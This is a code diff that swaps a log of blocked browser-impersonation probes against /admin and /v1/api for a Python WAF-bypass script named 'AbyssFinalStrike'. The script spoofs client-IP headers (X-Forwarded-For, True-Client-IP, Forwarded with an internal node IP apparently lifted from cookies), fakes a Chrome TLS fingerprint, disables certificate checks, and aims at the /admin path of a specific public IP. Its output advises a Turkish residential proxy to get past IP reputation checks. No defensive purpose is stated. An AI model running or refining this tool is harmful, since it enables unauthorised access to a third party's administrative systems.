@@ -1,22 +1,53 @@
-Analyzing: /admin
-[*] Impersonating: chrome124
-[+] Status: 406 | Size: 17941
-[-] 406 Reject: The WAF signature for chrome124 is still detected.
-[*] Impersonating: safari17_0
-[+] Status: 406 | Size: 17940
-[-] 406 Reject: The WAF signature for safari17_0 is still detected.
-[*] Impersonating: chrome110
-[+] Status: 406 | Size: 17941
-[-] 406 Reject: The WAF signature for chrome110 is still detected.
-------------------------------
-[*] Analyzing: /v1/api
-[*] Impersonating: chrome124
-[+] Status: 406 | Size: 17941
-[-] 406 Reject: The WAF signature for chrome124 is still detected.
-[*] Impersonating: safari17_0
-[+] Status: 406 | Size: 17940
-[-] 406 Reject: The WAF signature for safari17_0 is still detected.
-[*] Impersonating: chrome110
-[+] Status: 406 | Size: 17941
-[-] 406 Reject: The WAF signature for chrome110 is still detected.
-------------------------------
+import asyncio
+from curl_cffi.requests import AsyncSession
+
+class AbyssFinalStrike:
+    def __init__(self, target_ip):
+        self.target_url = f"https://{target_ip}"
+        # الـ IP الداخلي الذي استخرجناه سابقاً من الكوكيز
+        self.internal_node = "10.19.168.65"
+
+    async def strike(self, path):
+        url = f"{self.target_url}{path}"
+        
+        # تكتيك تزوير الهوية الجغرافي والداخلي
+        advanced_headers = {
+            "X-Forwarded-For": "176.232.0.1", # IP تركي حقيقي (Residential)
+            "X-Real-IP": "176.232.0.1",
+            "X-Originating-IP": "127.0.0.1",
+            "True-Client-IP": "176.232.0.1",
+            "Forwarded": f"for=176.232.0.1;host={self.internal_node};proto=https",
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8",
+        }
+
+        async with AsyncSession(verify=False) as session:
+            print(f"[*] Executing Header Smuggling on: {path}")
+            try:
+                # نستخدم بصمة Chrome ولكن مع تزوير الـ IPs
+                resp = await session.get(
+                    url, 
+                    impersonate="chrome124", 
+                    headers=advanced_headers,
+                    timeout=25
+                )
+                
+                print(f"[+] Status: {resp.status_code}")
+                
+                if resp.status_code == 200:
+                    print("[!!!] BYPASS SUCCESSFUL VIA IP SMUGGLING!")
+                elif resp.status_code == 406:
+                    print("[-] Critical: WAF is still rejecting based on Source IP Reputation.")
+                    print("[*] Advice: You MUST use a Turkish Residential Proxy to proceed.")
+                else:
+                    print(f"[-] Blocked with {resp.status_code}")
+                    
+            except Exception as e:
+                print(f"[-] Strike Error: {e}")
+
+async def main():
+    engine = AbyssFinalStrike("94.55.118.66")
+    await engine.strike("/admin")
+
+if __name__ == "__main__":
+    asyncio.run(main())
